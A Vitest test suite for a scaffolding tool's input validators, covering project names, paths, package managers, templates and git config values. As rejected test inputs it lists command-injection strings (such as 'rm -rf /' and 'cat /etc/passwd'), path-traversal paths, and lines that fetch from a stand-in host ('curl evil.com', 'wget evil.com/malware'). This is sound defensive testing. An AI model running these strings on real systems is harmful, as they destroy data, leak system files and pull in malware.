import { describe, it, expect } from 'vitest';
import {
  validateProjectName,
  validateProjectPath,
  validatePackageManager,
  validateTemplate,
  validateTemplatePath,
  validateOutputPath,
  sanitizeText,
  validateGitConfigValue,
} from '../lib/security.js';

describe('Security Utilities', () => {
  describe('validateProjectName', () => {
    it('should accept valid project names', () => {
      const validNames = [
        'my-project',
        'my_project',
        'project123',
        'Project.Name',
        'a',
        'test-app-v1.0',
      ];

      validNames.forEach((name) => {
        const result = validateProjectName(name);
        expect(result.success).toBe(true);
        expect(result.value).toBe(name);
      });
    });

    it('should reject invalid project names', () => {
      const invalidNames = [
        '',
        '   ',
        '-starts-with-dash',
        'has spaces',
        'has/slash',
        'has\\backslash',
        'has:colon',
        'has<bracket',
        'has>bracket',
        'has|pipe',
        'has"quote',
        'has*asterisk',
        'has?question',
        'x'.repeat(101), // too long
      ];

      invalidNames.forEach((name) => {
        const result = validateProjectName(name);
        expect(result.success).toBe(false);
      });
    });

    it('should reject reserved names', () => {
      const reservedNames = ['con', 'prn', 'aux', 'nul', 'com1', 'lpt1'];

      reservedNames.forEach((name) => {
        const result = validateProjectName(name);
        expect(result.success).toBe(false);
        expect(result.error.message).toContain('Reserved project name');
      });
    });

    it('should handle null and undefined inputs', () => {
      expect(validateProjectName(null as any).success).toBe(false);
      expect(validateProjectName(undefined as any).success).toBe(false);
      expect(validateProjectName(123 as any).success).toBe(false);
    });
  });

  describe('validateProjectPath', () => {
    const baseDir = '/safe/base/dir';

    it('should accept valid paths within base directory', () => {
      const validPaths = [
        'project',
        'sub/project',
        './project',
        'project/name',
      ];

      validPaths.forEach((path) => {
        const result = validateProjectPath(path, baseDir);
        expect(result.success).toBe(true);
      });
    });

    it('should reject path traversal attempts', () => {
      const dangerousPaths = [
        '../outside',
        '../../etc/passwd',
        '/absolute/path',
        'sub/../../../outside',
        'project\\..\\..\\outside', // Windows style
      ];

      dangerousPaths.forEach((path) => {
        const result = validateProjectPath(path, baseDir);
        expect(result.success).toBe(false);
      });
    });

    it('should reject paths with null bytes', () => {
      const result = validateProjectPath('project\0malicious', baseDir);
      expect(result.success).toBe(false);
    });

    it('should handle very long paths', () => {
      const longPath = 'a'.repeat(300);
      const result = validateProjectPath(longPath, baseDir);
      expect(result.success).toBe(false);
    });
  });

  describe('validatePackageManager', () => {
    it('should accept valid package managers', () => {
      const validPMs = ['npm', 'pnpm', 'yarn', 'bun'];

      validPMs.forEach((pm) => {
        const result = validatePackageManager(pm);
        expect(result.success).toBe(true);
        expect(result.value).toBe(pm);
      });
    });

    it('should normalize case', () => {
      const result = validatePackageManager('NPM');
      expect(result.success).toBe(true);
      expect(result.value).toBe('npm');
    });

    it('should reject invalid package managers', () => {
      const invalidPMs = [
        'pip',
        'cargo',
        'gem',
        '',
        'npm; rm -rf /',
        'npm && echo pwned',
      ];

      invalidPMs.forEach((pm) => {
        const result = validatePackageManager(pm);
        expect(result.success).toBe(false);
      });
    });
  });

  describe('validateTemplate', () => {
    it('should accept valid templates', () => {
      const validTemplates = ['basic', 'advanced', 'enterprise'];

      validTemplates.forEach((template) => {
        const result = validateTemplate(template);
        expect(result.success).toBe(true);
        expect(result.value).toBe(template);
      });
    });

    it('should normalize case', () => {
      const result = validateTemplate('BASIC');
      expect(result.success).toBe(true);
      expect(result.value).toBe('basic');
    });

    it('should reject invalid templates', () => {
      const invalidTemplates = ['custom', 'evil', '', 'basic; rm -rf /'];

      invalidTemplates.forEach((template) => {
        const result = validateTemplate(template);
        expect(result.success).toBe(false);
      });
    });
  });

  describe('validateTemplatePath', () => {
    const baseTemplateDir = '/templates';

    it('should accept valid template paths', () => {
      const validPaths = [
        'basic/src/index.ts',
        'shared/package.json',
        'advanced/src/commands/init.ts',
      ];

      validPaths.forEach((path) => {
        const result = validateTemplatePath(path, baseTemplateDir);
        expect(result.success).toBe(true);
      });
    });

    it('should reject template path traversal attempts', () => {
      const dangerousPaths = [
        '../../../etc/passwd',
        '../../../../etc/hosts',
        '/absolute/path/outside',
      ];

      dangerousPaths.forEach((path) => {
        const result = validateTemplatePath(path, baseTemplateDir);
        expect(result.success).toBe(false);
      });
    });
  });

  describe('validateOutputPath', () => {
    const baseOutputDir = '/output';

    it('should accept valid output paths', () => {
      const validPaths = [
        'src/index.ts',
        'package.json',
        'src/commands/build.ts',
        'docs/README.md',
      ];

      validPaths.forEach((path) => {
        const result = validateOutputPath(path, baseOutputDir);
        expect(result.success).toBe(true);
      });
    });

    it('should reject output path traversal attempts', () => {
      const dangerousPaths = [
        '../../../etc/passwd',
        '../../../../etc/hosts',
        '/absolute/path/outside',
      ];

      dangerousPaths.forEach((path) => {
        const result = validateOutputPath(path, baseOutputDir);
        expect(result.success).toBe(false);
      });
    });

    it('should reject paths with null bytes', () => {
      const result = validateOutputPath(
        'src/index.ts\0malicious',
        baseOutputDir,
      );
      expect(result.success).toBe(false);
    });
  });

  describe('sanitizeText', () => {
    it('should accept clean text', () => {
      const cleanTexts = [
        'Hello World',
        'Project Name',
        'test@example.com',
        'Version 1.0.0',
      ];

      cleanTexts.forEach((text) => {
        const result = sanitizeText(text);
        expect(result.success).toBe(true);
        expect(result.value).toBe(text);
      });
    });

    it('should remove dangerous characters', () => {
      const result = sanitizeText('Hello\0World');
      expect(result.success).toBe(true);
      expect(result.value).toBe('HelloWorld');
    });

    it('should remove control characters', () => {
      const result = sanitizeText('Hello\x01\x02World');
      expect(result.success).toBe(true);
      expect(result.value).toBe('HelloWorld');
    });

    it('should handle very long text', () => {
      const longText = 'a'.repeat(2000);
      const result = sanitizeText(longText);
      expect(result.success).toBe(false);
    });

    it('should handle custom max length', () => {
      const text = 'a'.repeat(100);
      const result = sanitizeText(text, 50);
      expect(result.success).toBe(false);
    });
  });

  describe('validateGitConfigValue', () => {
    it('should accept clean git config values', () => {
      const cleanValues = [
        'John Doe',
        'john@example.com',
        'user.name',
        'My Project',
      ];

      cleanValues.forEach((value) => {
        const result = validateGitConfigValue(value);
        expect(result.success).toBe(true);
        expect(result.value).toBe(value);
      });
    });

    it('should reject command injection attempts', () => {
      const dangerousValues = [
        'user; rm -rf /',
        'user && echo pwned',
        'user | cat /etc/passwd',
        'user `whoami`',
        'user $(whoami)',
        'user\\n--help',
        '--help',
        '-help',
      ];

      dangerousValues.forEach((value) => {
        const result = validateGitConfigValue(value);
        expect(result.success).toBe(false);
      });
    });

    it('should reject newlines', () => {
      const result = validateGitConfigValue('user\nname');
      expect(result.success).toBe(false);
    });

    it('should handle very long values', () => {
      const longValue = 'a'.repeat(300);
      const result = validateGitConfigValue(longValue);
      expect(result.success).toBe(false);
    });
  });

  describe('Security Integration Tests', () => {
    it('should handle chained validation correctly', () => {
      // Test a realistic scenario
      const projectName = 'my-test-project';
      const projectPath = './my-test-project';
      const packageManager = 'pnpm';
      const template = 'basic';
      const baseDir = process.cwd();

      const nameResult = validateProjectName(projectName);
      expect(nameResult.success).toBe(true);

      const pathResult = validateProjectPath(projectPath, baseDir);
      expect(pathResult.success).toBe(true);

      const pmResult = validatePackageManager(packageManager);
      expect(pmResult.success).toBe(true);

      const templateResult = validateTemplate(template);
      expect(templateResult.success).toBe(true);
    });

    it('should prevent complex attack scenarios', () => {
      // Simulate a complex attack attempt
      const maliciousProject = '../../../etc/passwd; rm -rf /';
      const maliciousPath = '../../../../etc';
      const maliciousPackageManager = 'npm && curl evil.com';
      const maliciousTemplate = 'basic; wget evil.com/malware';

      expect(validateProjectName(maliciousProject).success).toBe(false);
      expect(validateProjectPath(maliciousPath, '/safe').success).toBe(false);
      expect(validatePackageManager(maliciousPackageManager).success).toBe(
        false,
      );
      expect(validateTemplate(maliciousTemplate).success).toBe(false);
    });

    it('should handle edge cases gracefully', () => {
      // Test edge cases that might cause crashes
      const edgeCases = [null, undefined, '', 0, false, {}, []];

      edgeCases.forEach((edgeCase) => {
        expect(validateProjectName(edgeCase as any).success).toBe(false);
        expect(validatePackageManager(edgeCase as any).success).toBe(false);
        expect(validateTemplate(edgeCase as any).success).toBe(false);
      });
    });
  });
});
